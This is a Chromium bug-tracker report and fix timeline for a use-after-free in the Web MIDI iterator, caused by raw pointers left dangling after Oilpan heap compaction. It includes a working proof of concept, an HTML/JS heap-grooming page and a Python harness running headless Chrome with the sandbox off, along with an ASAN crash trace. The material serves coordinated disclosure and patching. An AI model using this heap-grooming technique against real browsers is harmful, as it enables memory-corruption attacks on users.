# Use-after-free in MIDIPortMap iterator due to untracked raw pointers surviving Oilpan compaction leads to renderer crash

| Field | Value |
|-------|-------|
| **Issue ID** | [485935314](https://issues.chromium.org/issues/485935314) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebMIDI |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | to...@chromium.org |
| **Created** | 2026-02-20 |
| **Bounty** | $2,000.00 |

## Description

## Title

Use-after-free in MIDIPortMap iterator due to untracked raw pointers surviving Oilpan compaction leads to renderer crash

## Summary

The `MIDIPortMap` template class in the Web MIDI API stores raw `CheckedContiguousIterator` pointers into an Oilpan `HeapVector` backing during iteration. When cppgc compaction relocates the backing store to defragment memory, these raw pointers are not updated and become dangling. Subsequent use of the iterator dereferences freed memory, resulting in a use-after-free that crashes the renderer process.

## Bisect

Introducing Commit: `16a6a8178c1cf059527ebaef54fe32195b1f1c1f`

- Date: `2024-10-09`
- Author: `fs@opera.com`
- Review: <https://chromium-review.googlesource.com/c/chromium/src/+/5913518>

## Root Cause

The `MIDIPortMap` template class serves as the backing implementation for `MIDIInputMap` and `MIDIOutputMap`, which are maplike iterables exposed to JavaScript via the Web MIDI API. When JavaScript creates an iterator over one of these maps (for example by calling `map.entries()`), the `CreateIterationSource` method constructs a `MapIterationSource` object that captures two `CheckedContiguousIterator` values pointing directly into the `entries_` HeapVector's backing store.

```
// third_party/blink/renderer/modules/webmidi/midi_port_map.h
using Entries = HeapVector<Member<ValueType>>;
using IteratorType = typename base::CheckedContiguousIterator<
    const typename Entries::ValueType>;

typename PairSyncIterable<InterfaceType>::IterationSource*
CreateIterationSource(ScriptState*) override {
  return MakeGarbageCollected<MapIterationSource>(
      this, entries_.CheckedBegin(), entries_.CheckedEnd());
}

```

The `MapIterationSource` stores these iterators as plain member fields. Critically, these fields are raw pointers into the HeapVector backing and are not traced by the garbage collector.

```
// third_party/blink/renderer/modules/webmidi/midi_port_map.h
class MapIterationSource final
    : public PairSyncIterable<InterfaceType>::IterationSource {
 public:
  MapIterationSource(MIDIPortMap<InterfaceType, ValueType>* map,
                     IteratorType iterator,
                     IteratorType end)
      : map_(map), iterator_(iterator), end_(end) {}

  bool FetchNextItem(ScriptState* script_state,
                     String& key,
                     ValueType*& value) override {
    if (iterator_ == end_)
      return false;
    key = (*iterator_)->id();   // dereferences raw pointer into backing
    value = *iterator_;
    ++iterator_;
    return true;
  }

  void Trace(Visitor* visitor) const override {
    visitor->Trace(map_);       // only traces map_, NOT iterator_ or end_
    PairSyncIterable<InterfaceType>::IterationSource::Trace(visitor);
  }

 private:
  const Member<const MIDIPortMap<InterfaceType, ValueType>> map_;
  IteratorType iterator_;       // RAW POINTER — not traced, not registered as movable
  const IteratorType end_;      // RAW POINTER — not traced, not registered as movable
};

```

The `HeapVector<Member<ValueType>>` backing is allocated within the `CompactableHeapVectorBackingSpace` because `Member<T>` satisfies the `kCanMoveWithMemcpy` requirement. This is confirmed by the compaction traits and space trait specializations.

```
// third_party/blink/renderer/platform/heap/collection_support/heap_vector_backing.h
template <typename T>
struct CompactionTraits<blink::HeapVectorBacking<T>> {
  static constexpr bool SupportsCompaction() {
    return blink::HeapVectorBacking<T>::TraitsType::kCanMoveWithMemcpy;
  }
};

template <typename T>
  requires(blink::internal::CompactionTraits<
           blink::HeapVectorBacking<T>>::SupportsCompaction())
struct SpaceTrait<blink::HeapVectorBacking<T>> {
  using Space = blink::CompactableHeapVectorBackingSpace;
};

```

During cppgc compaction, the compactor slides live objects within compactable space pages to eliminate fragmentation. It uses a `MovableReferences` map to track all traced slots pointing to compactable objects and updates them after relocation. However, the `iterator_` and `end_` fields in `MapIterationSource` are not `Member<T>` pointers and are never registered as movable references during marking. When the backing is memcpy'd to a new address, these raw pointers still reference the old location, which is either freed or repurposed.

The cppgc compactor normally guards against compaction when JavaScript is on the stack, because stack-conservative scanning cannot precisely enumerate all raw pointers. The `ShouldCompact` function returns false when `marking_type == kAtomic && stack_state == kMayContainHeapPointers`.

```
// v8/src/heap/cppgc/compactor.cc
bool Compactor::ShouldCompact(GCConfig::MarkingType marking_type,
                              StackState stack_state) const {
  if (compactable_spaces_.empty() ||
      (marking_type == GCConfig::MarkingType::kAtomic &&
       stack_state == StackState::kMayContainHeapPointers)) {
    return false;
  }
  // ...
  size_t free_list_size = UpdateHeapResidency(compactable_spaces_);
  return free_list_size > kFreeListSizeThreshold;  // 512KB
}

```

However, this guard can be legitimately bypassed. When a GC cycle is finalized from a non-nestable task context (as opposed to being called directly from JavaScript), the embedder stack state is `kNoHeapPointers` because no JavaScript frames are on the call stack. The V8 `gc()` extension function, when invoked with `execution: 'async'`, posts a non-nestable task that runs `InvokeGC` with `StackState::kNoHeapPointers`.

```
// v8/src/extensions/gc-extension.cc
void InvokeGC(v8::Isolate* isolate, const GCOptions gc_options) {
  Heap* heap = reinterpret_cast<Isolate*>(isolate)->heap();
  EmbedderStackStateScope stack_scope(
      heap,
      gc_options.execution == ExecutionType::kAsync
          ? EmbedderStackStateOrigin::kImplicitThroughTask
          : EmbedderStackStateOrigin::kExplicitInvocation,
      gc_options.execution == ExecutionType::kAsync
          ? StackState::kNoHeapPointers
          : StackState::kMayContainHeapPointers);
  // ...
}

```

In production, the same condition occurs naturally when V8's incremental marking job finalizes a GC cycle from a non-nestable task posted by the `IncrementalMarkingJob::ScheduleTask` method. When `NonNestableTasksEnabled()` returns true (which it does for Blink's task runners), the task runs with `kNoHeapPointers` and calls `AdvanceAndFinalizeIfComplete`, which can trigger mark-compact with compaction enabled. This means the vulnerability is exploitable without `--expose-gc` under the right allocation pressure and timing conditions.

The correct pattern for iterator state in the presence of compaction is to use an index rather than a raw pointer. The `MediaKeyStatusMap` implementation demonstrates this approach.

```
// third_party/blink/renderer/modules/encryptedmedia/media_key_status_map.cc
class MapIterationSource final
    : public PairSyncIterable<MediaKeyStatusMap>::IterationSource {
 public:
  MapIterationSource(MediaKeyStatusMap* map) : map_(map), current_(0) {}

  bool FetchNextItem(ScriptState* script_state,
                     V8BufferSource*& key,
                     V8MediaKeyStatus& value) override {
    if (current_ >= map_->size())
      return false;
    const auto& entry = map_->at(current_++);  // index-based, compaction-safe
    // ...
  }
};

```
## Reproduce

The PoC requires a Linux system with virtual MIDI ports. Load the `snd-virmidi` kernel module to provide multiple MIDI ports. The PoC uses the `--expose-gc` flag to call `gc()` from JavaScript with async execution, which triggers cppgc compaction under controlled conditions.

Prerequisites:

```
sudo modprobe snd-virmidi midi_devs=4
pip install websocket-client

```

Place the following HTML file as `poc_midi_uaf.html` in the Chrome ASAN build output directory.

```
<!DOCTYPE html>
<html>
<body>
<pre id="log"></pre>
<script>
const logEl = document.getElementById('log');
function log(msg) {
  logEl.textContent += msg + '\n';
  console.log(msg);
}

async function poc() {
  log('=== MIDIPortMap Iterator Compaction UAF PoC ===');

  let access;
  try { access = await navigator.requestMIDIAccess(); }
  catch(e) { log('[-] ' + e.message); return; }

  const map = access.outputs.size >= 2 ? access.outputs :
              access.inputs.size >= 2 ? access.inputs : null;
  if (!map) { log('[-] Need >=2 ports'); return; }
  log('[+] map.size=' + map.size);

  // ==================================================
  // Phase 1: Populate CompactableHeapVectorBackingSpace free list (>512KB)
  //
  // querySelectorAll returns StaticNodeList which has HeapVector<Member<Node>>
  // The backing of this HeapVector goes into CompactableHeapVectorBackingSpace
  // We create many such lists, drop them, and gc to sweep into the free list
  // ==================================================
  log('[*] Phase 1: Creating HeapVector<Member<Node>> backings...');

  // Create 1000 div elements to match
  const container = document.createElement('div');
  document.body.appendChild(container);
  for (let i = 0; i < 1000; i++) {
    container.appendChild(document.createElement('div'));
  }

  // querySelectorAll('div') creates StaticNodeList with HeapVector<Member<Node>>
  // ~1000 nodes * 8 bytes/Member = ~8KB backing each
  // 200 lists * 8KB = ~1.6MB in CompactableHeapVectorBackingSpace
  {
    const lists = [];
    for (let i = 0; i < 200; i++) {
      lists.push(document.querySelectorAll('div'));
    }
    // Drop all references
    lists.length = 0;
  }

  // Remove the container too
  document.body.removeChild(container);

  // Sync gc to sweep dead StaticNodeLists into the free list
  if (typeof gc === 'function') {
    gc({type: 'major', execution: 'sync'});
    gc({type: 'major', execution: 'sync'});
  }
  log('[+] Free list should have >512KB in compactable space');

  // ==================================================
  // Phase 2: Attack loop
  // ==================================================
  const ATTEMPTS = 20;
  for (let attempt = 1; attempt <= ATTEMPTS; attempt++) {
    log('[*] Attempt ' + attempt + '/' + ATTEMPTS);

    // Create iterator, storing RAW POINTERS into HeapVector backing
    // MapIterationSource.iterator_ and .end_ point into entries_ backing
    const iter = map.entries();
    const first = iter.next();
    if (first.done) { log('[-] Empty'); break; }

    // Trigger async gc which runs in non-nestable task with kNoHeapPointers
    // Compaction enabled because:
    //   forced gc -> ShouldReduceMemory = true
    //   stack_state = kNoHeapPointers -> ShouldCompact passes
    //   free_list > 512KB -> compaction runs
    // Compaction moves HeapVector backings, updating Member<T> refs
    // but NOT the raw CheckedContiguousIterator pointers -> dangling!
    if (typeof gc === 'function') {
      await gc({type: 'major', execution: 'async'});
    }

    // Use iterator with potentially dangling pointers
    try {
      const second = iter.next();
      if (!second.done) {
        log('  [+] key=' + second.value[0].substring(0, 8) + '...');
      } else {
        log('  [?] done=true (possible corruption)');
      }
    } catch(e) {
      log('  [!] CRASH: ' + e);
    }

    // Replenish free list: create more HeapVector backings and discard them
    {
      const c2 = document.createElement('div');
      document.body.appendChild(c2);
      for (let i = 0; i < 500; i++) {
        c2.appendChild(document.createElement('div'));
      }
      const lists = [];
      for (let i = 0; i < 200; i++) {
        lists.push(document.querySelectorAll('div'));
      }
      lists.length = 0;
      document.body.removeChild(c2);
    }
    if (typeof gc === 'function') {
      gc({type: 'major', execution: 'sync'});
    }
  }

  log('');
  log('[*] All attempts completed');
  log('[*] Check stderr for ASAN reports');
  log('DONE');
}

poc().catch(e => log('[!] ' + e));
</script>
</body>
</html>

```

Place the following Python harness as `run_midi_cdp.py` in any directory. It launches headless Chrome with MIDI permissions pre-granted, connects via Chrome DevTools Protocol, and monitors for console output and crashes.

```
#!/usr/bin/env python3
import http.server, json, os, subprocess, sys, threading, time, urllib.request
import websocket

os.chdir("/path/to/chromium/src/out/asan-release")

# Setup
HTTP_PORT = 8795
CDP_PORT = 9235

# Clean profile
os.system("rm -rf /tmp/midi_cdp_profile")
os.makedirs("/tmp/midi_cdp_profile/Default", exist_ok=True)
with open("/tmp/midi_cdp_profile/Default/Preferences", "w") as f:
    json.dump({"profile":{"content_settings":{"exceptions":{
        "midi":{"*,*":{"setting":1}},
        "midi_sysex":{"*,*":{"setting":1}}
    },"defaults":{"midi":1,"midi_sysex":1}}}}, f)

# HTTP server
def serve():
    h = http.server.SimpleHTTPRequestHandler
    http.server.HTTPServer(("127.0.0.1", HTTP_PORT), h).serve_forever()
threading.Thread(target=serve, daemon=True).start()
print(f"[+] HTTP :{HTTP_PORT}")

# Chrome
url = f"http://127.0.0.1:{HTTP_PORT}/poc_midi_uaf.html"
proc = subprocess.Popen([
    "./chrome", "--headless", "--no-sandbox", "--disable-gpu",
    "--js-flags=--expose-gc",
    f"--remote-debugging-port={CDP_PORT}",
    "--remote-allow-origins=*",
    f"--user-data-dir=/tmp/midi_cdp_profile",
    "--no-first-run", url
], stderr=open("/tmp/midi_cdp_stderr.txt", "w"), stdout=subprocess.DEVNULL)
print(f"[+] Chrome PID={proc.pid}")

# Wait for DevTools
tabs = None
for _ in range(30):
    try:
        tabs = json.loads(urllib.request.urlopen(
            f"http://127.0.0.1:{CDP_PORT}/json").read())
        if tabs: break
    except: pass
    time.sleep(1)

if not tabs:
    print("[-] No DevTools"); proc.kill(); sys.exit(1)

tab = next((t for t in tabs if "poc_midi" in t.get("url","")), tabs[0])
print(f"[+] Tab: {tab['url'][:80]}")

ws = websocket.create_connection(tab["webSocketDebuggerUrl"], timeout=5)
ws.send(json.dumps({"id":1,"method":"Runtime.enable"}))

# Also grant permission via CDP as backup
ws.send(json.dumps({"id":2,"method":"Browser.setPermission",
    "params":{"permission":{"name":"midi"},"setting":"granted",
              "origin":f"http://127.0.0.1:{HTTP_PORT}"}}))

deadline = time.time() + 240
done = False
while time.time() < deadline:
    try:
        ws.settimeout(3)
        r = json.loads(ws.recv())
        m = r.get("method","")
        if m == "Runtime.consoleAPICalled":
            text = " ".join(str(a.get("value","")) for a in r["params"]["args"])
            print(f"[C] {text}", flush=True)
            if "DONE" in text or "Fatal" in text:
                done = True; time.sleep(3); break
        elif m == "Inspector.targetCrashed":
            print("[!!!] CRASH!"); done = True; break
    except websocket.WebSocketTimeoutException:
        continue
    except Exception as e:
        print(f"[!] {e}"); break

if not done: print("[-] Timeout")

ws.close()
proc.terminate()
try: proc.wait(10)
except: proc.kill(); proc.wait(5)

# Check ASAN
with open("/tmp/midi_cdp_stderr.txt") as f:
    err = f.read()
print(f"\n[*] stderr: {len(err)} bytes")

asan_real = [l for l in err.split("\n")
             if "AddressSanitizer" in l and "CONSOLE" not in l]
if asan_real:
    print("\n[!!!] ASAN REPORT!")
    capture = False
    for l in err.split("\n"):
        if "==" in l and ("ERROR" in l or "AddressSanitizer" in l) and "CONSOLE" not in l:
            capture = True
        if capture:
            print(l)
            if "SUMMARY" in l: break
else:
    print("[-] No ASAN UAF")

```

Run:

```
sudo modprobe snd-virmidi midi_devs=4
python3 run_midi_cdp.py

```

ASAN output:

```
[+] HTTP :8795
[+] Chrome PID=1818971
[+] Tab: http://127.0.0.1:8795/poc_midi_uaf.html
[C] === MIDIPortMap Iterator Compaction UAF PoC ===
[C] [+] map.size=5
[C] [*] Phase 1: Creating HeapVector<Member<Node>> backings...
[C] [+] Free list should have >512KB in compactable space
[C] [*] Attempt 1/20
[C]   [+] key=67251C5E...
[C] [*] Attempt 2/20
[C]   [+] key=67251C5E...
[C] [*] Attempt 3/20
[C]   [+] key=67251C5E...
[C] [*] Attempt 4/20
[C]   [+] key=67251C5E...
[C] [*] Attempt 5/20
[C]   [+] key=67251C5E...
[C] [*] Attempt 6/20
[!!!] CRASH!

[*] stderr: 11499 bytes

[!!!] ASAN REPORT!
==1819069==ERROR: AddressSanitizer: use-after-poison on address 0x7b2c0044f1ac at pc 0x7f43748ecff4 bp 0x7fff4b033a70 sp 0x7fff4b033a68
READ of size 4 at 0x7b2c0044f1ac thread T0 (chrome)
    #0 0x7f43748ecff3 in Load v8/include/cppgc/internal/member-storage.h:92:58
    #1 0x7f43748ecff3 in GetRaw v8/include/cppgc/member.h:53:54
    #2 0x7f43748ecff3 in Get v8/include/cppgc/member.h:271:52
    #3 0x7f43748ecff3 in operator-> v8/include/cppgc/member.h:259:44
    #4 0x7f43748ecff3 in blink::MIDIPortMap<blink::MIDIOutputMap, blink::MIDIOutput>::MapIterationSource::FetchNextItem(blink::ScriptState*, blink::String&, blink::MIDIOutput*&) third_party/blink/renderer/modules/webmidi/midi_port_map.h:72:13
    #5 0x7f43748ec40d in blink::bindings::PairSyncIterationSource<blink::IDLStringBase<(blink::bindings::IDLStringConvMode)0>, blink::MIDIOutput, blink::String, blink::MIDIOutput*>::Next(blink::ScriptState*, blink::bindings::SyncIteratorBase::Kind) third_party/blink/renderer/bindings/core/v8/iterable.h:65:10
    #6 0x7f43729fefea in blink::(anonymous namespace)::v8_sync_iterator_midi_output_map::NextOperationCallback(v8::FunctionCallbackInfo<v8::Value> const&) gen/third_party/blink/renderer/bindings/modules/v8/v8_sync_iterator_midi_output_map.cc:83:39
    #7 0x7b42f7dd06a3  (<unknown module>)
    #8 0x7b42d80012d5  (<unknown module>)
    #9 0x7b42f7e135ed  (<unknown module>)
    #10 0x7b42f7f016a9  (<unknown module>)
    #11 0x7b42f7e01392  (<unknown module>)
    #12 0x7b42f7dcb52a  (<unknown module>)
    #13 0x7f437a124394 in Call v8/src/execution/simulator.h:216:12
    #14 0x7f437a124394 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:460:41
    #15 0x7f437a126499 in v8::internal::(anonymous namespace)::InvokeWithTryCatch(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:502:18
    #16 0x7f437a12689f in v8::internal::Execution::TryRunMicrotasks(v8::internal::Isolate*, v8::internal::MicrotaskQueue*) v8/src/execution/execution.cc:606:10
    #17 0x7f437a1ce6ec in v8::internal::MicrotaskQueue::RunMicrotasks(v8::internal::Isolate*) v8/src/execution/microtask-queue.cc:185:22
    #18 0x7f437a1d0380 in PerformCheckpointInternal v8/src/execution/microtask-queue.cc:129:3
    #19 0x7f437a1d0380 in v8::internal::MicrotaskQueue::PerformCheckpoint(v8::Isolate*) v8/src/execution/microtask-queue.h:48:5
    #20 0x7f4381b9e4cf in blink::scheduler::EventLoop::PerformMicrotaskCheckpoint() third_party/blink/renderer/platform/scheduler/common/event_loop.cc:80:21
    #21 0x7f4381bd4d86 in blink::scheduler::AgentGroupSchedulerImpl::PerformMicrotaskCheckpoint() third_party/blink/renderer/platform/scheduler/main_thread/agent_group_scheduler_impl.cc:117:12
    #22 0x7f4381c1829a in blink::scheduler::MainThreadSchedulerImpl::PerformMicrotaskCheckpoint() third_party/blink/renderer/platform/scheduler/main_thread/main_thread_scheduler_impl.cc:1349:28
    #23 0x7f4381c29e4f in blink::scheduler::MainThreadSchedulerImpl::OnTaskCompleted(base::WeakPtr<blink::scheduler::MainThreadTaskQueue>, base::sequence_manager::Task const&, base::sequence_manager::TaskQueue::TaskTiming*, base::LazyNow*) third_party/blink/renderer/platform/scheduler/main_thread/main_thread_scheduler_impl.cc:2687:3
    #24 0x7f4381c49c79 in blink::scheduler::MainThreadTaskQueue::OnTaskCompleted(base::sequence_manager::Task const&, base::sequence_manager::TaskQueue::TaskTiming*, base::LazyNow*) third_party/blink/renderer/platform/scheduler/main_thread/main_thread_task_queue.cc:140:29
    #25 0x7f4381c4d606 in base::RepeatingCallback<void (base::sequence_manager::Task const&, base::sequence_manager::TaskQueue::TaskTiming*, base::LazyNow*)>::Run(base::sequence_manager::Task const&, base::sequence_manager::TaskQueue::TaskTiming*, base::LazyNow*) const & base/functional/callback.h:343:12
    #26 0x7f43dc5862e0 in base::sequence_manager::internal::SequenceManagerImpl::NotifyDidProcessTask(base::sequence_manager::internal::SequenceManagerImpl::ExecutingTask*, base::LazyNow*) base/task/sequence_manager/sequence_manager_impl.cc:852:35
    #27 0x7f43dc585ee3 in base::sequence_manager::internal::SequenceManagerImpl::DidRunTask(base::LazyNow&) base/task/sequence_manager/sequence_manager_impl.cc:602:3
    #28 0x7f43dc5e22ff in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:491:37
    #29 0x7f43dc5e1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #30 0x7f43dc4033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #31 0x7f43dc5e37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #32 0x7f43dc4cb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #33 0x7f43d20025e5 in content::RendererMain(content::MainFunctionParams) content/renderer/renderer_main.cc:364:16
    #34 0x7f43d2434c27 in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14
    #35 0x7f43d2435dee in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:771:12
    #36 0x7f43d243834a in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1150:10
    #37 0x7f43d2432ad3 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:358:36
    #38 0x7f43d2432e5a in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:371:10
    #39 0x55f830018f15 in ChromeMain chrome/app/chrome_main.cc:191:12
    #40 0x7f436be29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

Address 0x7b2c0044f1ac is a wild pointer inside of access range of size 0x000000000004.
SUMMARY: AddressSanitizer: use-after-poison v8/include/cppgc/internal/member-storage.h:92:58 in Load

```

The crash occurs at frame 4 inside `MIDIPortMap::MapIterationSource::FetchNextItem`, confirming that the raw `iterator_` pointer references memory that was poisoned by ASAN after the compactor relocated the HeapVector backing to a new address.

## Credit

Please use c6eed09fc8b174b0f3eebedcceb1e792 as the credit for this vulnerability. Thank you.

## Timeline

### an...@chromium.org (2026-02-20)

Setting severity to S1 since this is a UAF in renderer without requiring any specific user intervention.
Set FoundIn to 144 based on bisect CL date.
toyoshim@, can you PTAL as owner and reviewer of the bisect CL? I haven't actually reproduced this bug but I'm hoping the information including the ASAN trace provides the necessary info.

### ch...@google.com (2026-02-21)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-21)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### aj...@google.com (2026-02-24)

I'm skeptical of the bisect to 16a6a8178c1cf059527ebaef54fe32195b1f1c1f as that was a spanification CL

### fs...@opera.com (2026-02-25)

No, I would suspect this dates all the way back to 0c49cb4ea25b4649d0955b9233b02c20ae2bb994 (<https://codereview.chromium.org/513203002>). Should probably replace the iterator with a plain index? That should defeat any changes due to compaction. (A `shrink_to_fit()` might work equally well in this caseI guess, but keeping index feels more robust.)

### fs...@opera.com (2026-02-25)

I uploaded <https://chromium-review.googlesource.com/c/chromium/src/+/7606579> as proposed fix for this issue. I've yet to wade through the description above 😅, but I expect it should fix the issue. Did a quick audit of similar cases, and there may be some more.

### to...@chromium.org (2026-02-26)

Thank you for the investigation and fix!
It seems a long long living bug...

### fs...@opera.com (2026-02-26)

It should probably be "bounded" by when heap compaction was enabled, which was ~2017 I think.

### dx...@google.com (2026-02-26)

Project: chromium/src  

Branch:  main  

Author:  Fredrik Söderquist [fs@opera.com](mailto:fs@opera.com)  

Link:    <https://chromium-review.googlesource.com/7606579>

Store index instead of iterator in MIDIPortMap::MapIterationSource

---


Expand for full commit details
```
     
    This avoids keeping pointers into the backing store of the entries 
    Vector<>. As a bonus it's also more compact. 
     
    Fixed: 485935314 
    Change-Id: I841ea3d8332de7ed3e35e65ae5b6e9bdf16e09d9 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7606579 
    Reviewed-by: Takashi Toyoshima <toyoshim@chromium.org> 
    Commit-Queue: Fredrik Söderquist <fs@opera.com> 
    Cr-Commit-Position: refs/heads/main@{#1590718}

```

---

Files:

- M `third_party/blink/renderer/modules/webmidi/midi_port_map.h`

---

Hash: [c9b1a8741a48f379a60d9c8f052b20ffa1c5e901](https://chromiumdash.appspot.com/commit/c9b1a8741a48f379a60d9c8f052b20ffa1c5e901)  

Date: Thu Feb 26 10:03:18 2026


---

### ch...@google.com (2026-02-26)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1590718) appears to be after extended stable branch point (1552494).
Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1590718) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1590718) appears to be after beta branch point (1582197).
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### fs...@opera.com (2026-02-27)

1. <https://chromium-review.googlesource.com/7606579>
2. Yes.
3. No.
4. No.
5. Yes, see description for step-by-step instructions.
6. --

### ch...@google.com (2026-02-27)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-27)

Merge review required: M145 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-27)

Merge review required: M144 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### fs...@opera.com (2026-02-27)

1. Fixes a potential UAF.
2. <https://chromium-review.googlesource.com/7606579>
3. Yes.
4. No.
5. No.
6. Yes, see description for step-by-step instructions.

### dr...@chromium.org (2026-03-03)

No crashes in Canary, approving merge to M146. We don't plan any more releases of M144 or M145, so no need to do those merges.

### fs...@opera.com (2026-03-04)

The merge for m146 is up (<https://chromium-review.googlesource.com/c/chromium/src/+/7628061>), but a broken bot (android-binary-size) is currently preventing it from landing.

### dx...@google.com (2026-03-04)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Fredrik Söderquist [fs@opera.com](mailto:fs@opera.com)  

Link:    <https://chromium-review.googlesource.com/7628061>

Store index instead of iterator in MIDIPortMap::MapIterationSource

---


Expand for full commit details
```
     
    This avoids keeping pointers into the backing store of the entries 
    Vector<>. As a bonus it's also more compact. 
     
    (cherry picked from commit c9b1a8741a48f379a60d9c8f052b20ffa1c5e901) 
     
    Fixed: 485935314 
    Change-Id: I841ea3d8332de7ed3e35e65ae5b6e9bdf16e09d9 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7606579 
    Reviewed-by: Takashi Toyoshima <toyoshim@chromium.org> 
    Commit-Queue: Fredrik Söderquist <fs@opera.com> 
    Cr-Original-Commit-Position: refs/heads/main@{#1590718} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7628061 
    Auto-Submit: Fredrik Söderquist <fs@opera.com> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/7680@{#1870} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `third_party/blink/renderer/modules/webmidi/midi_port_map.h`

---

Hash: [33d0f35cc4da7cc3c8ff8967d0144bd04e4e5c6f](https://chromiumdash.appspot.com/commit/33d0f35cc4da7cc3c8ff8967d0144bd04e4e5c6f)  

Date: Wed Mar 4 18:59:21 2026


---

### pe...@google.com (2026-03-04)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### fs...@opera.com (2026-03-05)

1. No
2. No

### pe...@google.com (2026-03-06)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### fs...@opera.com (2026-03-09)

1. One (1).
2. Low - replacing a pair of iterators with an index, with minimal changes to logic.
3. Merged to M146 (stable).
4. Yes

### vi...@google.com (2026-03-09)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7638330
